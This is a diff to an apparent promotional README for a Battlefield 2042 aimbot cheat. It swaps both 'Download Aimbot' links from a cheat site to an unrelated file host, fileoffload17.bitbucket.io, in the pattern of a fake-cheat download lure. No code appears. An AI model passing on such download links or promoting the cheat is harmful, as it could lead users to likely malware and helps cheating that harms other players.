@@ -6,7 +6,7 @@ In a game like **Battlefield 2042**, reflexes are cool—but a **legit aimbot** 
 
 You’ll go from “missed all my shots” to “why is everyone spectating me?”
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/battlefield-2042/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload17.bitbucket.io)
 ---
 
 ## 🎯 What Is Battlefield 2042 Aimbot?
@@ -15,7 +15,7 @@ The **aimbot** is a precision mod that automatically locks your crosshair onto e
 
 > 🔫 Perfect for aggressive rushers, snipers, or passive long-range gods.
 
-[![Download Aimbot](https://yougame.biz/proxy.php?image=https%3A%2F%2Fi.postimg.cc%2FT1x7Zgzh%2Fcrooked2042-215-rcj-H7-Fb-Oidq0h-Dyy3-HW4.jpg&hash=3f0d4f3fbfeeffb817b92aae66f85757)](https://wecheaters.github.io/cheats/battlefield-2042/)
+[![Download Aimbot](https://yougame.biz/proxy.php?image=https%3A%2F%2Fi.postimg.cc%2FT1x7Zgzh%2Fcrooked2042-215-rcj-H7-Fb-Oidq0h-Dyy3-HW4.jpg&hash=3f0d4f3fbfeeffb817b92aae66f85757)](https://fileoffload17.bitbucket.io)
 ---
 
 ## 🔧 Key Aimbot Features
